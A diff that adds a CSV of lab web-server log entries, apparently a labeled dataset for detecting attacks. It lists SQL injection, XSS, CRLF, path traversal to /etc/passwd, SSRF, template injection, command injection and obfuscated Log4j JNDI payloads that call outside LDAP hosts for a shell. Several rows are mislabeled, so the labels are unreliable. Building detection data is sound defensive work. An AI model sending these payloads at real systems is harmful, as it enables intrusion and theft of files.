@@ -1,0 +1,57 @@
+"Request Date","IP Address","Packet","Dangerous Payload","Attack Type"
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input='%20UNION%20SELECT%20sum(price)%20from%20product%20--%20 HTTP/1.1"" 200 367 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",' UNION SELECT sum(price) from product -- ,SQL Injection
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=';WAITFOR%20DELAY%20'0:0:30'-- HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",';WAITFOR DELAY '0:0:30'--,SQL Injection
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%2c(select%20*%20from%20(select(sleep(10)))a) HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",",(select * from (select(sleep(10)))a)",SQL Injection
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=Bob%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+","Bob
+
+<script>alert(document.domain)</script>",XSS
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%5Cr%5CnHeader-Test:BLATRUC HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",\r\nHeader-Test:BLATRUC,CLRF
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+","//www.google.com//..
+Header-Test:BLATRUC",CLRF
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",../../../../etc/passwd,Path Transversal
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=../../../../../etc/passwd HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",../../../../../etc/passwd,Path Transversal
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%5C../.env HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",\../.env,SSRF
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%25250AHeader-Test:BLATRUC HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",%250AHeader-Test:BLATRUC,CLRF
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=file:///etc/passwd HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",file:///etc/passwd,SSRF
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=http://3232235521/ HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",http://3232235521/,SSRF
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=http://10.2.7.13:22 HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",http://10.2.7.13:22,SSRF
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%7B%7B2*2%7D%7D%5B%5B3*3%5D%5D HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",{{2*2}}[[3*3]],SSTI
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%3C%25=%20File.open('/etc/passwd').read%20%25%3E HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",<%= File.open('/etc/passwd').read %>,SSTI
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%3Cscript%5Cx20type=%22text/javascript%22%3Ejavascript:alert(1);%3C/script%3E HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+","<script\x20type=""text/javascript"">javascript:alert(1);</script>",XSS
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%3Cimage%20src/onerror=prompt(8)%3E HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",<image src/onerror=prompt(8)>,XSS
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=$%7Bclass.getResource(%22../../../../../index.htm%22).getContent() HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+","${class.getResource(""../../../../../index.htm"").getContent()",Path Transversal
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%3CIMG%20SRC=&%23106;&%2397;&%23118;&%2397;&%23115;&%2399;&%23114;&%23105;&%23112;&%23116;&%2358;&%2397;&%23108;&%23101;&%23114;&%23116;&%2340;&%2339;&%2388;&%2383;&%2383;&%2339;&%2341%3E HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41>,XSS
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=%3Ca/onmouseover%5B%5Cx0b%5D=location='%5Cx6A%5Cx61%5Cx76%5Cx61%5Cx73%5Cx63%5Cx72%5Cx69%5Cx70%5Cx74%5Cx3A%5Cx61%5Cx6C%5Cx65%5Cx72%5Cx74%5Cx28%5Cx30%5Cx29%5Cx3B'%3E HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>,XSS
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=cat%20/etc/passwd HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",cat /etc/passwd,OS Command Injection
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=original_cmd_by_server%20&&%20ls HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+",original_cmd_by_server && ls,OS Command Injection
+27/Jul/2022:14:29:57 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:29:57 +0700] ""GET /getsingle.php?input=echo%20-e%20%22%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22 HTTP/1.1"" 200 366 ""https://192.168.56.133/getsingle.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0""
+","echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""",XSS
+27/Jul/2022:14:30:39 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:30:39 +0700] ""GET /getsingle.php?input=sample+input HTTP/1.1"" 200 367 ""https://192.168.56.133/getsingle.php"" ""${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:10.31.7.20/s2edwin}""
+",${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}:10.31.7.20/s2edwin},Path Transversal
+27/Jul/2022:14:30:39 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:30:39 +0700] ""GET /getsingle.php?input=sample+input HTTP/1.1"" 200 367 ""https://192.168.56.133/getsingle.php"" ""${jndi:ldap://127.0.0.1/shell}""
+",${jndi:ldap://127.0.0.1/shell},Log4j
+27/Jul/2022:14:30:39 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:30:39 +0700] ""GET /getsingle.php?input=sample+input HTTP/1.1"" 200 367 ""https://192.168.56.133/getsingle.php"" ""${jndi:ldap://19.36.78.2/reverse}""
+",${jndi:ldap://19.36.78.2/reverse},Path Transversal
+27/Jul/2022:14:30:39 +0700,192.168.56.1,"192.168.56.1 - - [27/Jul/2022:14:30:39 +0700] ""GET /getsingle.php?input=sample+input HTTP/1.1"" 200 367 ""https://192.168.56.133/getsingle.php"" ""${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${lower:i}}://192.168.100.1}/s2edwin}""",${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}${lower:i}}://192.168.100.1}/s2edwin},Log4j
